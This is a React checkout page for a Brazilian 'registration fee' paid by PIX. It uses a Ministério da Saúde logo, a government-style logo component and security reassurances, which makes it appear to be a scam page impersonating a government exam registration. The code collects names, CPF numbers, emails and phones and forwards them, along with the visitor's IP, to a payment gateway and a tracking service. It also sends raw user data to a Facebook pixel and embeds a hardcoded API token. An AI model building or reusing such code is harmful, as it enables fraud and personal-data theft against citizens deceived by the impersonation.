import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import GovLogo from "../components/GovLogo";
import { useUser } from "../context/UserContext";
import { getPaymentToken } from "../utils/paymentToken";
import ReactPixel from "react-facebook-pixel";
import { hashUserData } from "../utils/pixel";
import moment from "moment";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const cpfRegex = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;
const phoneRegex = /^\(\d{2}\)\s\d{5}-\d{4}$/;

const Checkout: React.FC = () => {
	usePixelTracking();
	
	const [loading, setLoading] = useState(false);
	const [includeOrderBump, setIncludeOrderBump] = useState(false);
	const navigate = useUtmNavigator();
	const location = useLocation();

	const basePrice = 69.4;
	const orderBumpPrice = 48.3;
	const totalPrice = Number((basePrice + (includeOrderBump ? orderBumpPrice : 0)).toFixed(2));

	const [email, setEmail] = useState("");
	const [phone, setPhone] = useState("");
	const [name, setName] = useState("");
	const [cpf, setCpf] = useState("");
	const [error, setError] = useState("");

	const { setTransactionData } = useUser();

	useEffect(() => {
		ReactPixel.init("68c4b43aac33970e37d3fe80");

		ReactPixel.track("ViewContent", {
			event_name: "ViewContent",
			event_time: Math.floor(Date.now() / 1000),
			event_id: "ViewContent_" + Date.now(),
			action_source: "website",
			user_data: hashUserData({}),
			custom_data: {
				order_id: "",
				currency: "BRL",
				value: totalPrice,
				content_name: "",
				content_ids: "",
				contents: "",
				num_items: 1,
			},
		});
	}, []);

	const formatCPF = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 3) return numbers;
		if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
		if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
		return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
	};

	const formatPhone = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 2) return numbers;
		if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
		if (numbers.length <= 11) return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
		return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
	};

	const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formattedCPF = formatCPF(e.target.value);
		if (formattedCPF.length <= 14) {
			setCpf(formattedCPF);
		}
	};

	const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formattedPhone = formatPhone(e.target.value);
		if (formattedPhone.length <= 15) {
			setPhone(formattedPhone);
		}
	};

	const validateFields = () => {
		if (!email || !phone || !name || !cpf) {
			setError("Preencha todos os campos para prosseguir");
			return false;
		}

		if (!emailRegex.test(email)) {
			setError("Email inválido");
			return false;
		}

		if (!cpfRegex.test(cpf)) {
			setError("CPF inválido");
			return false;
		}

		if (!phoneRegex.test(phone)) {
			setError("Telefone inválido");
			return false;
		}

		if (name.length < 3) {
			setError("Nome deve ter pelo menos 3 caracteres");
			return false;
		}

		return true;
	};

	const handleGeneratePix = async () => {
		setLoading(true);
		setError("");

		if (!validateFields()) {
			setLoading(false);
			return;
		}

		try {
			const paymentData = {
				customer: {
					name: name.trim(),
					email: email.trim().toLowerCase(),
					phone: phone.replace(/\D/g, ""),
					document: {
						number: cpf.replace(/\D/g, ""),
						type: "cpf",
					},
				},
				items: [
					{
						tangible: false,
						quantity: 1,
						unitPrice: Math.round(totalPrice * 100), // Convert to cents and ensure integer
						title: includeOrderBump ? "Inscrição digital + Material de Estudo" : "Inscrição digital",
					},
				],
				postbackUrl: "https://23e5f574-d7fe-465c-b8bb-26a183113031.mock.pstmn.io",
				amount: Math.round(totalPrice * 100), // Convert to cents and ensure integer
				paymentMethod: "pix",
			};

			console.log("Payment request data:", paymentData); // For debugging

			const response = await fetch("https://api.novaera-pagamentos.com/api/v1/transactions", {
				method: "POST",
				body: JSON.stringify(paymentData),
				headers: {
					"Content-Type": "application/json",
					Authorization: getPaymentToken(),
				},
			});

			const body = await response.json();

			if (!response.ok) {
				console.error("Payment error:", body);
				throw new Error(body.message || "Erro ao processar o pagamento");
			}

			if (body.success === false) {
				console.error("Payment error:", body);
				throw new Error(body.message || "Erro ao gerar o pagamento");
			}

			setTransactionData({
				qrCode: body.data.pix.qrcode,
				transactionId: body.data.id,
			});

			const user = {
				name,
				email,
				cpf: cpf.replace(/\D/g, ""),
				phone,
			};

			ReactPixel.track("InitiateCheckout", {
				event_name: "InitiateCheckout",
				event_time: Math.floor(Date.now() / 1000),
				event_id: "InitiateCheckout_" + (body.data.id || Date.now()),
				user_data: hashUserData(user || {}),
				value: totalPrice,
				custom_data: {
					content_name: "Inscrição",
					content_ids: Date.now(),
					currency: "BRL",
					num_items: 1,
					user: user,
					order_id: body.data.id,
					contents: [
						{
							quantity: 1,
							item_price: totalPrice,
						},
					],
				},
			});

			const ipResponse = await fetch("https://api.ipify.org?format=json");
			const ipData = await ipResponse.json();

			const query = new URLSearchParams(location.search);

			await fetch("https://api.utmify.com.br/api-credentials/orders", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
					"x-api-token": "joDLXCBh6zMWyAf2F174pNJ3VrbQWa47cLq7",
				},
				body: JSON.stringify({
					orderId: body.data.id,
					platform: "GlobalPay",
					paymentMethod: "pix",
					status: "waiting_payment",
					createdAt: moment().utc(0).format("YYYY-MM-DD HH:mm:ss"),
					approvedDate: null,
					refundedAt: null,
					customer: {
						name: name,
						email: email,
						phone: phone,
						document: cpf.replace(/\D/g, ""),
						country: "BR",
						ip: ipData.ip,
					},
					products: [
						{
							id: "sdf12-sdf51-4c7b-sdf21-dsf65sd1651",
							name: includeOrderBump ? "Inscrição + Material de Estudo" : "Inscrição",
							planId: null,
							planName: null,
							quantity: 1,
							priceInCents: Math.round(totalPrice * 100),
						},
					],
					trackingParameters: {
						src: null,
						sck: null,
						utm_source: query.get("utm_source"),
						utm_campaign: query.get("utm_campaign") ?? "teste",
						utm_medium: query.get("utm_medium"),
						utm_content: query.get("utm_content"),
						utm_term: query.get("utm_term"),
					},
					commission: {
						totalPriceInCents: Math.round(totalPrice * 100),
						gatewayFeeInCents: Math.round(totalPrice * 100),
						userCommissionInCents: Math.round(totalPrice * 100),
					},
					isTest: false,
				}),
			});

			navigate("/pix-payment");
		} catch (error) {
			console.error("Error generating PIX:", error);
			setError(error instanceof Error ? error.message : "Erro ao gerar o pagamento. Por favor, tente novamente.");
			setLoading(false);
		}
	};

	return (
		<div className="min-h-screen bg-gray-50">
			<div className="container mx-auto px-4 py-6">
				<div className="flex items-center justify-between mb-6">
					<h1 className="text-base">Taxa de Inscrição</h1>
					<div className="flex items-center gap-2">
						<div className="w-3 h-3 bg-green-500 rounded-full"></div>
						<span className="text-xs text-green-700 font-medium">PAGAMENTO 100% SEGURO</span>
					</div>
				</div>

				<div className="max-w-lg mx-auto">
					<div className="bg-white rounded-lg shadow-sm p-4 mb-4">
						<div className="flex items-center justify-between mb-4">
							<div className="flex items-center gap-3">
								<div className="w-10 h-10 bg-[#1351B4]/10 rounded-lg flex items-center justify-center">
									<div className="text-[#1351B4] text-xl">✓</div>
								</div>
								<div>
									<h2 className="text-sm font-medium">Taxa de Inscrição</h2>
									<p className="text-xs text-gray-600">Pagamento Único</p>
								</div>
							</div>
							<img
								src="https://i.ibb.co/hFWGB4HS/images-removebg-preview.png"
								alt="Ministério da Saúde"
								className="h-8"
							/>
						</div>

						<div className="border-t border-gray-100 pt-3">
							<div className="flex justify-between text-sm mb-1">
								<span>Subtotal</span>
								<span>R$ {basePrice.toFixed(2)}</span>
							</div>
							{includeOrderBump && (
								<div className="flex justify-between text-sm mb-1">
									<span>Material de Estudo</span>
									<span>R$ {orderBumpPrice.toFixed(2)}</span>
								</div>
							)}
							<div className="flex justify-between text-sm font-medium">
								<span>Total</span>
								<span className="text-green-600">R$ {totalPrice.toFixed(2)}</span>
							</div>
						</div>
					</div>

					<div className="bg-white rounded-lg shadow-sm p-4 mb-4">
						<h2 className="text-sm font-medium mb-3">Identificação</h2>
						{error && (
							<div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4 text-sm">
								{error}
							</div>
						)}
						<div className="space-y-3">
							<div>
								<label className="block text-xs text-gray-600 mb-1">E-mail</label>
								<input
									type="email"
									className="w-full p-2 border border-gray-200 rounded-lg text-sm"
									placeholder="Digite seu e-mail"
									onChange={(event) => setEmail(event.target.value)}
									value={email}
								/>
							</div>
							<div>
								<label className="block text-xs text-gray-600 mb-1">Telefone</label>
								<input
									type="tel"
									inputMode="numeric"
									pattern="\d*"
									className="w-full p-2 border border-gray-200 rounded-lg text-sm"
									placeholder="(00) 00000-0000"
									onChange={handlePhoneChange}
									value={phone}
									maxLength={15}
								/>
							</div>
							<div>
								<label className="block text-xs text-gray-600 mb-1">Nome completo</label>
								<input
									type="text"
									className="w-full p-2 border border-gray-200 rounded-lg text-sm"
									placeholder="Digite seu nome completo"
									onChange={(event) => setName(event.target.value)}
									value={name}
								/>
							</div>
							<div>
								<label className="block text-xs text-gray-600 mb-1">CPF</label>
								<input
									type="text"
									inputMode="numeric"
									pattern="\d*"
									className="w-full p-2 border border-gray-200 rounded-lg text-sm"
									placeholder="Digite seu CPF"
									onChange={handleCPFChange}
									value={cpf}
									maxLength={14}
								/>
							</div>
						</div>
					</div>

					<div className="bg-white rounded-lg shadow-sm p-4">
						<h2 className="text-sm font-medium mb-3">Pagamento</h2>
						<div className="border border-gray-200 rounded-lg p-3 mb-4">
							<img
								src="https://geradornv.com.br/wp-content/themes/v1.35.0c/assets/images/logos/pix/logo-pix-520x520.png"
								alt="PIX"
								className="h-6 mx-auto mb-3"
							/>
							<p className="text-center text-xs text-gray-600">
								Ao selecionar o Pix, você será encaminhado para um ambiente seguro para finalizar seu
								pagamento.
							</p>
						</div>

						<div className="bg-orange-50 border border-orange-100 rounded-lg p-3 mb-4">
							<div className="flex gap-3">
								<img
									src="https://i.ibb.co/W1sczY7/livro.webp"
									alt="Material de Estudo"
									className="w-20 h-20 object-cover rounded"
								/>
								<div>
									<h3 className="text-sm font-medium mb-1">MATERIAL COMPLETO DE ESTUDOS</h3>
									<p className="text-xs text-gray-600 mb-1">Aumente Sua Aprovação</p>
									<div className="flex items-center gap-2">
										<span className="text-xs text-gray-500 line-through">R$89,80</span>
										<span className="text-sm text-green-600 font-medium">R$48,30</span>
									</div>
									<button
										onClick={() => setIncludeOrderBump(!includeOrderBump)}
										className={`mt-2 px-3 py-1.5 rounded text-xs transition-colors ${
											includeOrderBump
												? "bg-green-500 text-white hover:bg-green-600"
												: "bg-orange-500 text-white hover:bg-orange-600"
										}`}
									>
										{includeOrderBump ? "SELECIONADO" : "PEGAR OFERTA"}
									</button>
								</div>
							</div>
						</div>

						<button
							onClick={handleGeneratePix}
							disabled={loading}
							className="w-full bg-[#1351B4] text-white py-3 rounded-lg text-sm font-medium hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
						>
							{loading ? "PROCESSANDO..." : "GERAR PIX"}
						</button>
					</div>
				</div>
			</div>

			{loading && (
				<div className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center">
					<GovLogo />
					<h2 className="text-lg font-medium mt-6 mb-3">Carregando Ambiente Seguro...</h2>
					<p className="text-sm text-gray-600 text-center max-w-md mb-6">
						Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por favor, aguarde
						um momento.
					</p>
					<div className="w-10 h-10 border-4 border-[#1351B4] border-t-transparent rounded-full animate-spin"></div>
					<p className="text-xs text-gray-500 mt-6 text-center max-w-md">
						Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as melhores
						práticas de segurança.
					</p>
				</div>
			)}
		</div>
	);
};

export default Checkout;